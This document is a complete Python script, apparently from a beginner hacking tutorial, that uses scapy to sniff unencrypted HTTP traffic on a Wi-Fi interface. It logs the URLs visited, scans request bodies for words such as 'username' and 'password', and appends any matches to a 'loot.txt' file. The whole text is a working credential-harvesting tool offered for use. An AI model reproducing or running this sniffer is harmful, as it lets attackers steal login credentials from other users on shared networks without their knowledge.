import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    # This filters specifically for port 80 (HTTP)
    scapy.sniff(iface=interface, store=False, prn=process_packet, filter="port 80")

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] Visiting: {url.decode()}")

        if packet.haslayer(scapy.Raw):
            # STEP 1: Get the data
            load = packet[scapy.Raw].load.decode(errors='ignore')
            
            # STEP 2: The "Filter" - Only look for these words
            keywords = ["username", "user", "password", "pass", "login"]
            
            for word in keywords:
                if word in load.lower():
                    # This only runs if a keyword is found
                    print(f"\n\n[!!!] Possible Credentials Found: {load}")
                    
                    # STEP 3: The "Notebook" - Save the "Gold" to your file
                    with open("loot.txt", "a") as f:
                        f.write(f"URL: {url.decode()} | Data: {load}\n")
                    
                    break

# Start the sniffer
sniff("Wi-Fi")